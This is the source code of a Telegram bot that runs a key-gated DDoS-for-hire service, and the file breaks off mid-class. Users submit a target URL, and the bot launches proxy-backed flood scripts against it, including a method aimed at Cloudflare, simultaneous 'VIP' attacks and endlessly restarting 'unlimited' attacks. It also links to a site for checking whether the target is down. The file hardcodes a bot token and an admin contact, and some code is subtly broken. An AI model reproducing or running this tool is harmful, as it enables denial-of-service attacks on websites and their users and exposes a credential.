const fs = require('fs').promises;
const { spawn } = require('child_process');
const moment = require('moment');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// ==================== Configuration ====================
class Config {
  constructor() {
    this.botToken = '8466880238:AAGGEFLQ9T3TGrgoY0RgDHBUW2jKG7k3nLs';
    this.botName = 'Permanent';
    this.adminId = 7780973203;
    this.maxFreeTime = 120;
    this.adminMaxTime = 999999;
    this.cooldownTime = 10;
    this.validMethods = ['zaher', 'zaherH2', 'cfzaher'];
    this.vipMethods = [...this.validMethods];
    this.simulMethods = ['zaher'];
    this.methodsFile = path.join(__dirname, 'assets', 'methods.json');
    this.userDataFile = path.join(__dirname, 'data', 'users.json');
    this.keysFile = path.join(__dirname, 'data', 'keys.json');
    this.configFile = path.join(__dirname, 'data', 'config.json');
    this.maxSlots = 3;
    this.adminMaxSlots = 10;
    this.pollingOptions = {
      interval: 300,
      timeout: 10,
      limit: 100,
      retryTimeout: 5000,
      params: { timeout: 10 }
    };
    this.simultaneousAttacks = {
      enabled: true,
      maxConcurrent: 5,
      defaultMethods: ['zaher', 'zaherH2', 'cfzaher'],
      cooldownMultiplier: 1.5
    };
  }

  async load() {
    try {
      const data = await fs.readFile(this.configFile, 'utf8');
      const saved = JSON.parse(data);
      if (saved.vipMethods) this.vipMethods = saved.vipMethods;
      if (saved.simulMethods) this.simulMethods = saved.simulMethods;
      if (saved.simultaneousAttacks) this.simultaneousAttacks.maxConcurrent = saved.simultaneousAttacks.maxConcurrent;
      console.log('✅ Loaded saved configuration');
    } catch (err) {
      if (err.code !== 'ENOENT') console.error('❌ Error loading config:', err);
    }
  }

  async save() {
    try {
      const dir = path.dirname(this.configFile);
      await fs.mkdir(dir, { recursive: true });
      const toSave = {
        vipMethods: this.vipMethods,
        simulMethods: this.simulMethods,
        simultaneousAttacks: { maxConcurrent: this.simultaneousAttacks.maxConcurrent },
        lastUpdated: new Date().toISOString()
      };
      await fs.writeFile(this.configFile, JSON.stringify(toSave, null, 2));
      console.log('✅ Configuration saved');
    } catch (err) {
      console.error('❌ Error saving config:', err);
    }
  }
}

// ==================== Data Manager ====================
class DataManager {
  constructor(config) {
    this.config = config;
    this.users = {};
    this.keys = {};
  }

  async loadUsers() {
    try {
      const data = await fs.readFile(this.config.userDataFile, 'utf8');
      this.users = JSON.parse(data);
    } catch (err) {
      if (err.code !== 'ENOENT') console.error('Error loading user data:', err);
    }
  }

  async saveUsers() {
    try {
      const dir = path.dirname(this.config.userDataFile);
      await fs.mkdir(dir, { recursive: true });
      await fs.writeFile(this.config.userDataFile, JSON.stringify(this.users, null, 2));
    } catch (err) {
      console.error('Error saving user data:', err);
    }
  }

  async loadKeys() {
    try {
      const data = await fs.readFile(this.config.keysFile, 'utf8');
      this.keys = JSON.parse(data);
    } catch (err) {
      if (err.code !== 'ENOENT') console.error('Error loading keys data:', err);
    }
  }

  async saveKeys() {
    try {
      const dir = path.dirname(this.config.keysFile);
      await fs.mkdir(dir, { recursive: true });
      await fs.writeFile(this.config.keysFile, JSON.stringify(this.keys, null, 2));
    } catch (err) {
      console.error('Error saving keys data:', err);
    }
  }

  recordUserActivity(userId, username, chatId) {
    if (!this.users[userId]) {
      this.users[userId] = {
        username: username || `user_${userId}`,
        chatId,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        attackCount: 0,
        key: null,
        simultaneousAttacks: 0
      };
    } else {
      this.users[userId].lastSeen = new Date().toISOString();
      this.users[userId].username = username || this.users[userId].username;
    }
    this.saveUsers(); // fire and forget
  }

  validateKey(key) {
    return this.keys[key] && this.keys[key].enabled;
  }

  getUserKey(userId) {
    return this.users[userId]?.key;
  }

  setUserKey(userId, key) {
    if (!this.users[userId]) {
      this.users[userId] = { username: `user_${userId}`, chatId: null, firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString(), attackCount: 0, key, simultaneousAttacks: 0 };
    } else {
      this.users[userId].key = key;
    }
    if (!this.keys[key].usedBy.includes(userId)) {
      this.keys[key].usedBy.push(userId);
    }
    this.saveUsers();
    this.saveKeys();
  }

  incrementAttackCount(userId, count = 1) {
    if (this.users[userId]) {
      this.users[userId].attackCount += count;
      this.saveUsers();
    }
  }

  incrementSimultaneousCount(userId) {
    if (this.users[userId]) {
      this.users[userId].simultaneousAttacks++;
      this.saveUsers();
    }
  }
}

// ==================== Attack Executor ====================
class AttackExecutor {
  constructor(config, dataManager, activeAttacks, userAttackSlots) {
    this.config = config;
    this.dataManager = dataManager;
    this.activeAttacks = activeAttacks;
    this.userAttackSlots = userAttackSlots;
  }

  runAttack(method, url, port, time, userId, chatId) {
    return new Promise((resolve, reject) => {
      const attackId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
      const scriptName = method.toUpperCase();
      let args = [];
      switch (method.toLowerCase()) {
        case 'zaher': args = [scriptName + '.js', url, time, '85', '10', 'proxy.txt']; break;
        case 'zaherh2': args = [scriptName + '.js', url, time, '100', '11', 'proxy.txt']; break;
        case 'cfzaher': args = [scriptName + '.js', url, time, '58', '16', 'proxy.txt']; break;
        default: args = [scriptName + '.js', url, time, '64', '10', 'proxy.txt'];
      }
      const scriptPath = path.join(__dirname, scriptName + '.js');
      if (!fs.existsSync(scriptPath)) {
        return reject(new Error(`Attack script for ${method} not found`));
      }

      console.log(`Starting ${method} attack: node ${args.join(' ')}`);
      const child = spawn('node', args, { stdio: 'inherit' });

      const attackInfo = { userId, chatId, child, target: url, method, startTime: Date.now(), duration: parseInt(time) * 1000, attackId };
      this.activeAttacks.set(attackId, attackInfo);
      this._addToUserSlots(userId, attackId);

      const timeout = setTimeout(() => {
        if (this.activeAttacks.has(attackId)) {
          child.kill('SIGTERM');
          this.activeAttacks.delete(attackId);
          this._removeFromUserSlots(userId, attackId);
        }
      }, parseInt(time) * 1000);

      child.on('exit', (code, signal) => {
        clearTimeout(timeout);
        if (this.activeAttacks.has(attackId)) {
          this.activeAttacks.delete(attackId);
          this._removeFromUserSlots(userId, attackId);
        }
        if (code === 0 || signal === 'SIGTERM') resolve(attackId);
        else reject(new Error(`${method} attack script exited with code ${code}`));
      });

      child.on('error', (err) => {
        clearTimeout(timeout);
        if (this.activeAttacks.has(attackId)) {
          this.activeAttacks.delete(attackId);
          this._removeFromUserSlots(userId, attackId);
        }
        reject(err);
      });
    });
  }

  _addToUserSlots(userId, attackId) {
    const slots = this.userAttackSlots.get(userId) || [];
    slots.push(attackId);
    this.userAttackSlots.set(userId, slots);
  }

  _removeFromUserSlots(userId, attackId) {
    const slots = this.userAttackSlots.get(userId) || [];
    const index = slots.indexOf(attackId);
    if (index !== -1) {
      slots.splice(index, 1);
      this.userAttackSlots.set(userId, slots);
    }
  }

  async runVipAttack(url, time, userId, chatId) {
    const promises = this.config.vipMethods.map(m => this.runAttack(m, url, 443, time, userId, chatId));
    const results = await Promise.allSettled(promises);
    const failed = results.filter(r => r.status === 'rejected').length;
    return { success: true, methodCount: this.config.vipMethods.length, failed };
  }

  async runSimultaneousAttacks(url, time, userId, chatId, customMethods = []) {
    const methods = customMethods.length ? customMethods : this.config.simulMethods;
    const promises = methods.map(m => this.runAttack(m, url, 443, time, userId, chatId));
    const results = await Promise.allSettled(promises);
    const failed = results.filter(r => r.status === 'rejected').length;
    return { success: true, methodCount: methods.length, failed };
  }

  async runCustomSimultaneousAttack(url, time, methods, userId, chatId) {
    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
    if (invalid.length) throw new Error(`Invalid methods: ${invalid.join(', ')}`);
    if (methods.length > this.config.simultaneousAttacks.maxConcurrent) {
      throw new Error(`Maximum ${this.config.simultaneousAttacks.maxConcurrent} methods allowed`);
    }
    return this.runSimultaneousAttacks(url, time, userId, chatId, methods);
  }
}

// ==================== Attack Manager ====================
class AttackManager {
  constructor(config, dataManager, activeAttacks, userAttackSlots, userAttackStatus) {
    this.config = config;
    this.dataManager = dataManager;
    this.activeAttacks = activeAttacks;
    this.userAttackSlots = userAttackSlots;
    this.userAttackStatus = userAttackStatus;
  }

  canUserAttack(userId) {
    if (userId === this.config.adminId) return true;
    const key = this.dataManager.getUserKey(userId);
    if (!key || !this.dataManager.validateKey(key)) return false;
    const status = this.userAttackStatus.get(userId);
    if (!status) return true;
    const now = Date.now();
    if (status.status === 'running') return false;
    if (status.status === 'cooldown' && now < status.readyTime) return false;
    return true;
  }

  setUserRunning(userId) {
    this.userAttackStatus.set(userId, { status: 'running' });
  }

  setUserCooldown(userId, multiplier = 1) {
    const cooldownMs = this.config.cooldownTime * multiplier * 1000;
    this.userAttackStatus.set(userId, { status: 'cooldown', readyTime: Date.now() + cooldownMs });
  }

  clearUserStatus(userId) {
    this.userAttackStatus.delete(userId);
  }

  getRemainingCooldown(userId) {
    const status = this.userAttackStatus.get(userId);
    if (status?.status === 'cooldown') {
      return Math.ceil((status.readyTime - Date.now()) / 1000);
    }
    return 0;
  }

  getUserSlots(userId) {
    return this.userAttackSlots.get(userId) || [];
  }

  getMaxSlots(userId) {
    return userId === this.config.adminId ? this.config.adminMaxSlots : this.config.maxSlots;
  }

  hasAvailableSlot(userId) {
    return this.getUserSlots(userId).length < this.getMaxSlots(userId);
  }

  canRunSimultaneous(userId, requiredSlots) {
    return this.getUserSlots(userId).length + requiredSlots <= this.getMaxSlots(userId);
  }

  async stopUserAttacks(userId, bot) {
    let stopped = 0;
    for (const attackId of this.getUserSlots(userId)) {
      const attack = this.activeAttacks.get(attackId);
      if (attack?.child) {
        attack.child.kill('SIGTERM');
        stopped++;
        this.activeAttacks.delete(attackId);
        try {
          await bot.sendMessage(attack.chatId, `⛔ Your attack on ${attack.target} has been stopped`);
        } catch {}
      }
    }
    this.userAttackSlots.set(userId, []);
    return stopped;
  }

  async stopAllAttacks(bot) {
    let stopped = 0;
    for (const [attackId, attack] of this.activeAttacks.entries()) {
      if (attack.child) {
        attack.child.kill('SIGTERM');
        stopped++;
        try {
          await bot.sendMessage(attack.chatId, `⛔ Your attack has been stopped by administrator`);
        } catch {}
      }
      this.activeAttacks.delete(attackId);
      this._removeFromUserSlots(attack.userId, attackId);
    }
    return stopped;
  }

  _removeFromUserSlots(userId, attackId) {
    const slots = this.userAttackSlots.get(userId) || [];
    const index = slots.indexOf(attackId);
    if (index !== -1) slots.splice(index, 1);
    this.userAttackSlots.set(userId, slots);
  }
}

// ==================== Unlimited Attack Manager ====================
class UnlimitedAttackManager {
  constructor(attackExecutor, unlimitedAttacks) {
    this.attackExecutor = attackExecutor;
    this.unlimitedAttacks = unlimitedAttacks;
  }

  async start(userId, chatId, url) {
    const attackId = `unlimited_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    this.unlimitedAttacks.set(attackId, { userId, chatId, url, active: true });

    const runCycle = async () => {
      if (!this.unlimitedAttacks.has(attackId) || !this.unlimitedAttacks.get(attackId).active) return;
      try {
        console.log(`♾️ Starting unlimited attack cycle for ${url}`);
        await this.attackExecutor.runSimultaneousAttacks(url, '120', userId, chatId);
        if (this.unlimitedAttacks.has(attackId) && this.unlimitedAttacks.get(attackId).active) {
          setTimeout(runCycle, 2000);
        }
      } catch {
        if (this.unlimitedAttacks.has(attackId) && this.unlimitedAttacks.get(attackId).active) {
          setTimeout(runCycle, 5000);
        }
      }
    };

    runCycle();
    return attackId;
  }

  stop(attackId) {
    const attack = this.unlimitedAttacks.get(attackId);
    if (attack) attack.active = false;
    this.unlimitedAttacks.delete(attackId);
  }

  stopAllForUser(userId) {
    let count = 0;
    for (const [attackId, attack] of this.unlimitedAttacks.entries()) {
      if (attack.userId === userId) {
        attack.active = false;
        this.unlimitedAttacks.delete(attackId);
        count++;
      }
    }
    return count;
  }

  hasForUser(userId) {
    for (const attack of this.unlimitedAttacks.values()) {
      if (attack.userId === userId && attack.active) return true;
    }
    return false;
  }

  getAllForUser(userId) {
    const result = [];
    for (const [attackId, attack] of this.unlimitedAttacks.entries()) {
      if (attack.userId === userId) result.push({ attackId, ...attack });
    }
    return result;
  }
}

// ==================== Utilities ====================
const defaultMethods = [
  { name: 'ZAHER', description: 'Zaher method attack', sts: 'Active' },
  { name: 'ZAHERH2', description: 'H2 version of Zaher method', sts: 'Active' },
  { name: 'CFZAHER', description: 'Cloudflare Zaher method', sts: 'Active' }
];

class MessageFormatter {
  static methodsList() {
    try {
      if (!fs.existsSync(config.methodsFile)) return this._formatMethods(defaultMethods);
      const methods = JSON.parse(fs.readFileSync(config.methodsFile, 'utf8'));
      return this._formatMethods(methods);
    } catch {
      return this._formatMethods(defaultMethods);
    }
  }

  static _formatMethods(methods) {
    return methods.reduce((acc, m) => acc + `*${m.name}* | ${m.description} | ${m.sts}\n`, 
      "*📊 Available Methods:*\nName | Description | Status\n-----------------------------\n");
  }

  static errorMessage() {
    return `
*❌ Invalid Command*
Syntax: <method> <url> <port> <time>
Example: ZAHER https://example.com 443 120

Type /help for more information.
`;
  }

  static helpMessage() {
    return `
*🤖 Available Commands*

/methods  - View all attack methods
/help     - Show this help message
/status   - Check your attack status
/owner    - Contact administrator
/stop     - Stop all attacks (Admin only)
/key      - Set your access key
/mykey    - Check your current key
/slots    - Check your attack slots

*⚡ Attack Commands*
<method> <url> <port> <time> - Run specific attack
/vip <url> <time> - Run VIP attack (Multiple methods simultaneously)
/simul <url> <time> - Run simultaneous attacks
/simul Unlimited <url> - Run unlimited simultaneous attacks (auto-restart every 120s)
/multi <url> <time> <methods> - Run custom simultaneous attacks

*📋 Examples:*
ZAHER https://example.com 443 120
/simul Unlimited https://example.com
`;
  }

  static adminContact() {
    return `
______________________
👤 Contact Administrator
Telegram: @FoundCount
______________________
`;
  }

  static attackDetails(method, url, port, time) {
    return `
* Attack Launched Successfully!*
|-➤Target: ${url}
|-➤Port: ${port}
|-➤Duration: ${time} seconds
|-➤Method: ${method.toUpperCase()}
|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
`;
  }

  static vipAttackDetails(url, time, methods) {
    return `
* VIP Attack Launched Successfully!*
|-➤Target: ${url}
|-➤Duration: ${time} seconds
|-➤Methods: ${methods.join(', ').toUpperCase()} (Simultaneous)
|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
|-➤Power: ${methods.length}x attack power
`;
  }

  static simultaneousAttackDetails(url, time, methods) {
    return `
* SIMULTANEOUS ATTACK LAUNCHED!*

|-➤Target: ${url}
|-➤Duration: ${time} seconds
|-➤Methods: ${methods.join(', ').toUpperCase()}
|-➤Attack Count: ${methods.length} simultaneous attacks
|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
|-➤Power: ${methods.length}x normal power
`;
  }

  static unlimitedAttackDetails(url) {
    return `
* UNLIMITED ATTACK STARTED!*

|-➤Target: ${url}
|-➤Cycle: 120 seconds
|-➤Mode: Auto-restart until /stop
|-➤Methods: ${config.simulMethods.join(', ').toUpperCase()}
|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
|-➤Status:  Running continuously
`;
  }

  static validateInputs(url, port, time, userId, maxFreeTime, adminMaxTime) {
    const maxTime = userId === config.adminId ? adminMaxTime : maxFreeTime;
    try { new URL(url); } catch { return "Invalid URL format. Please include http:// or https://"; }
    if (port && (isNaN(port) || port < 1 || port > 65535)) return "Port must be a number between 1 and 65535";
    if (time && (isNaN(time) || time <= 0)) return "Time must be a positive number";
    if (time && time > maxTime) return `Time cannot exceed ${maxTime} seconds`;
    return null;
  }

  static formatKeysList(keys) {
    let response = "*🔑 Key List:*\n\n";
    for (const [key, data] of Object.entries(keys)) {
      response += `Key: ${key}\nType: ${data.type}\nStatus: ${data.enabled ? '✅ Enabled' : '❌ Disabled'}\nCreated: ${moment(data.createdAt).format('YYYY-MM-DD')}\nUsed by: ${data.usedBy.length} users\n────────────────\n`;
    }
    return response;
  }

  static formatSlotsInfo(userId, userAttackSlots, activeAttacks, maxSlots) {
    const slots = userAttackSlots.get(userId) || [];
    const used = slots.length;
    let response = `*🎯 Your Attack Slots*\n\nUsed: ${used}/${maxSlots}\nAvailable: ${maxSlots - used}\n\n`;
    if (used) {
      response += `*Active Attacks:*\n`;
      slots.forEach((attackId, i) => {
        const attack = activeAttacks.get(attackId);
        if (attack) {
          const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
          const remaining = attack.duration - elapsed;
          response += `${i+1}. ${attack.method.toUpperCase()} on ${attack.target} (${remaining}s left)\n`;
        }
      });
    }
    return response;
  }
}

// ==================== Command Handler ====================
class CommandHandler {
  constructor(bot, config, dataManager, attackManager, attackExecutor, unlimitedManager, userAttackSlots, activeAttacks) {
    this.bot = bot;
    this.config = config;
    this.dataManager = dataManager;
    this.attackManager = attackManager;
    this.attackExecutor = attackExecutor;
    this.unlimitedManager = unlimitedManager;
    this.userAttackSlots = userAttackSlots;
    this.activeAttacks = activeAttacks;
  }

  async handleStart(msg) {
    this.dataManager.recordUserActivity(msg.from.id, msg.from.username, msg.chat.id);
    await this.bot.sendMessage(msg.chat.id, MessageFormatter.helpMessage(), { parse_mode: 'Markdown' });
  }

  async handleHelp(chatId) {
    await this.bot.sendMessage(chatId, MessageFormatter.helpMessage(), { parse_mode: 'Markdown' });
  }

  async handleMethods(chatId) {
    await this.bot.sendMessage(chatId, MessageFormatter.methodsList(), { parse_mode: 'Markdown' });
  }

  async handleOwner(chatId) {
    await this.bot.sendMessage(chatId, MessageFormatter.adminContact(), { parse_mode: 'Markdown' });
  }

  async handleStatus(chatId, userId) {
    const remaining = this.attackManager.getRemainingCooldown(userId);
    const hasUnlimited = this.unlimitedManager.hasForUser(userId);
    let status = remaining > 0 ? `⏳ Cooldown active: ${remaining}s remaining` : `✅ Ready to launch attacks`;
    if (hasUnlimited) status += `\n♾️ Unlimited attack running`;
    const slots = this.attackManager.getUserSlots(userId).length;
    const max = this.attackManager.getMaxSlots(userId);
    status += `\n🎯 Active attacks: ${slots}/${max}`;
    await this.bot.sendMessage(chatId, status);
  }

  async handleStop(chatId, userId) {
    const stopped = await this.attackManager.stopUserAttacks(userId, this.bot);
    stopped += this.unlimitedManager.stopAllForUser(userId);
    await this.bot.sendMessage(chatId, stopped ? `✅ Stopped ${stopped} attack(s)!` : '❌ No active attacks found.');
  }

  async handleKey(chatId, userId, inputs) {
    if (inputs.length < 2) return this.bot.sendMessage(chatId, "Usage: /key <access-key>");
    const key = inputs[1].toUpperCase();
    if (!this.dataManager.validateKey(key)) return this.bot.sendMessage(chatId, "❌ Invalid or disabled key");
    this.dataManager.setUserKey(userId, key);
    await this.bot.sendMessage(chatId, `✅ Key activated successfully!`);
  }

  async handleMyKey(chatId, userId) {
    const key = this.dataManager.getUserKey(userId);
    if (!key) return this.bot.sendMessage(chatId, `❌ No active key! Set one with /key <key>`);
    const keyInfo = this.dataManager.keys[key];
    if (!keyInfo) return this.bot.sendMessage(chatId, "❌ Your key is no longer valid.");
    await this.bot.sendMessage(chatId, 
      `🔑 *Your Key Information*\n\nKey: ${key}\nType: ${keyInfo.type}\nStatus: ${keyInfo.enabled ? '✅ Enabled' : '❌ Disabled'}\nSimultaneous Attacks: ${this.dataManager.users[userId]?.simultaneousAttacks || 0}`,
      { parse_mode: 'Markdown' }
    );
  }

  async handleSlots(chatId, userId) {
    const max = this.attackManager.getMaxSlots(userId);
    const text = MessageFormatter.formatSlotsInfo(userId, this.userAttackSlots, this.activeAttacks, max);
    await this.bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  }

  async handleAttack(userId, chatId, method, url, port, time) {
    if (!this.attackManager.hasAvailableSlot(userId)) {
      return this.bot.sendMessage(chatId, `❌ Max slots (${this.attackManager.getMaxSlots(userId)}) reached. Wait for current attacks.`);
    }
    if (!this.attackManager.canUserAttack(userId)) {
      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
        return this.bot.sendMessage(chatId, `❌ Key required!`);
      }
      const remaining = this.attackManager.getRemainingCooldown(userId);
      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before next attack.`);
    }
    const error = MessageFormatter.validateInputs(url, port, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);

    this.attackManager.setUserRunning(userId);
    try {
      const details = MessageFormatter.attackDetails(method, url, port, time);
      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await this.bot.sendMessage(chatId, `🎯 *Attack Monitoring*\nCheck target status: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
      await this.attackExecutor.runAttack(method, url, port, time, userId, chatId);
      this.attackManager.setUserCooldown(userId);
      await this.bot.sendMessage(chatId, `🎯 Attack completed! Cooldown: ${this.config.cooldownTime} seconds`);
      this.dataManager.incrementAttackCount(userId);
    } catch (err) {
      this.attackManager.clearUserStatus(userId);
      console.error(`❌ Attack error for user ${userId}:`, err);
      await this.bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
  }

  async handleVipAttack(userId, chatId, url, time) {
    const required = this.config.vipMethods.length;
    if (!this.attackManager.canRunSimultaneous(userId, required)) {
      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
      return this.bot.sendMessage(chatId, `❌ VIP attack requires ${required} slots. You have ${available} available.`);
    }
    if (!this.attackManager.canUserAttack(userId)) {
      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
        return this.bot.sendMessage(chatId, `❌ Key required for VIP attacks!`);
      }
      const remaining = this.attackManager.getRemainingCooldown(userId);
      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before VIP attack.`);
    }
    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);

    this.attackManager.setUserRunning(userId);
    try {
      const details = MessageFormatter.vipAttackDetails(url, time, this.config.vipMethods);
      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await this.bot.sendMessage(chatId, ` VIP Attack Monitoring\n${this.config.vipMethods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
      const result = await this.attackExecutor.runVipAttack(url, time, userId, chatId);
      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
      this.dataManager.incrementSimultaneousCount(userId);
      this.dataManager.incrementAttackCount(userId, this.config.vipMethods.length);
      let msg = `✅ VIP attack completed! ${this.config.vipMethods.length} attacks finished.`;
      if (result.failed) msg += ` (${result.failed} failed)`;
      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
      await this.bot.sendMessage(chatId, msg);
    } catch (err) {
      this.attackManager.clearUserStatus(userId);
      console.error(`❌ VIP attack error for user ${userId}:`, err);
      await this.bot.sendMessage(chatId, `❌ Error during VIP attack: ${err.message}`);
    }
  }

  async handleSimultaneousAttack(userId, chatId, url, time, methodInput = '') {
    if (methodInput.toLowerCase() === 'unlimited') {
      return this.handleUnlimitedAttack(userId, chatId, url);
    }
    const required = this.config.simulMethods.length;
    if (!this.attackManager.canRunSimultaneous(userId, required)) {
      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
      return this.bot.sendMessage(chatId, `❌ SIMULTANEOUS attack requires ${required} slots. You have ${available} available.`);
    }
    if (!this.attackManager.canUserAttack(userId)) {
      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
        return this.bot.sendMessage(chatId, `❌ Key required for simultaneous attacks!`);
      }
      const remaining = this.attackManager.getRemainingCooldown(userId);
      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before simultaneous attack.`);
    }
    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);

    this.attackManager.setUserRunning(userId);
    try {
      const details = MessageFormatter.simultaneousAttackDetails(url, time, this.config.simulMethods);
      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await this.bot.sendMessage(chatId, ` SIMULTANEOUS Attack\n${this.config.simulMethods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
      const result = await this.attackExecutor.runSimultaneousAttacks(url, time, userId, chatId);
      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
      this.dataManager.incrementSimultaneousCount(userId);
      this.dataManager.incrementAttackCount(userId, this.config.simulMethods.length);
      let msg = `✅ SIMULTANEOUS attack completed! ${this.config.simulMethods.length} attacks finished.`;
      if (result.failed) msg += ` (${result.failed} failed)`;
      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
      await this.bot.sendMessage(chatId, msg);
    } catch (err) {
      this.attackManager.clearUserStatus(userId);
      console.error(`❌ Simultaneous attack error for user ${userId}:`, err);
      await this.bot.sendMessage(chatId, `❌ Error during simultaneous attack: ${err.message}`);
    }
  }

  async handleUnlimitedAttack(userId, chatId, url) {
    if (!this.attackManager.canUserAttack(userId)) {
      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
        return this.bot.sendMessage(chatId, `❌ Key required for unlimited attacks!`);
      }
      const remaining = this.attackManager.getRemainingCooldown(userId);
      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before unlimited attack.`);
    }
    const error = MessageFormatter.validateInputs(url, 443, '120', userId, this.config.maxFreeTime, this.config.adminMaxTime);
    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
    if (this.unlimitedManager.hasForUser(userId)) {
      return this.bot.sendMessage(chatId, `❌ You already have an unlimited attack running. Use /stop to stop it first.`);
    }

    try {
      const details = MessageFormatter.unlimitedAttackDetails(url);
      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await this.bot.sendMessage(chatId, `♾️ *Unlimited Attack Monitoring*\nAttacks will auto-restart every 120s\nCheck: [Check-Host](${checkUrl})\n\nUse /stop to terminate`, { parse_mode: 'Markdown', disable_web_page_preview: true });
      const attackId = await this.unlimitedManager.start(userId, chatId, url);
      await this.bot.sendMessage(chatId, `✅ Unlimited attack started! Attack ID: ${attackId.substr(0,8)}...\n\nThis attack will run in cycles of 120 seconds until you use /stop.`);
    } catch (err) {
      console.error(`❌ Unlimited attack error for user ${userId}:`, err);
      await this.bot.sendMessage(chatId, `❌ Error starting unlimited attack: ${err.message}`);
    }
  }

  async handleMultiAttack(userId, chatId, url, time, methodsInput) {
    const methods = methodsInput.split(',').map(m => m.trim().toLowerCase());
    const required = methods.length;
    if (!this.attackManager.canRunSimultaneous(userId, required)) {
      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
      return this.bot.sendMessage(chatId, `❌ Custom attack requires ${required} slots. You have ${available} available.`);
    }
    if (!this.attackManager.canUserAttack(userId)) {
      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
        return this.bot.sendMessage(chatId, `❌ Key required for custom attacks!`);
      }
      const remaining = this.attackManager.getRemainingCooldown(userId);
      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before custom attack.`);
    }
    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);

    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid methods: ${invalid.join(', ')}`);
    if (methods.length > this.config.simultaneousAttacks.maxConcurrent) {
      return this.bot.sendMessage(chatId, `❌ Maximum ${this.config.simultaneousAttacks.maxConcurrent} methods allowed`);
    }

    this.attackManager.setUserRunning(userId);
    try {
      const details = MessageFormatter.simultaneousAttackDetails(url, time, methods);
      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await this.bot.sendMessage(chatId, ` CUSTOM Attack\n${methods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
      const result = await this.attackExecutor.runCustomSimultaneousAttack(url, time, methods, userId, chatId);
      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
      this.dataManager.incrementSimultaneousCount(userId);
      this.dataManager.incrementAttackCount(userId, methods.length);
      let msg = `✅ Custom attack completed! ${methods.length} attacks finished.`;
      if (result.failed) msg += ` (${result.failed} failed)`;
      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
      await this.bot.sendMessage(chatId, msg);
    } catch (err) {
      this.attackManager.clearUserStatus(userId);
      console.error(`❌ Custom attack error for user ${userId}:`, err);
      await this.bot.sendMessage(chatId, `❌ Error during custom simultaneous attack: ${err.message}`);
    }
  }
}

// ==================== Admin Command Handler ====================
class AdminCommandHandler {
  constructor(bot, config, dataManager, attackManager, unlimitedManager, userAttackSlots, activeAttacks) {
    this.bot = bot;
    this.config = config;
    this.dataManager = dataManager;
    this.attackManager = attackManager;
    this.unlimitedManager = unlimitedManager;
    this.userAttackSlots = userAttackSlots;
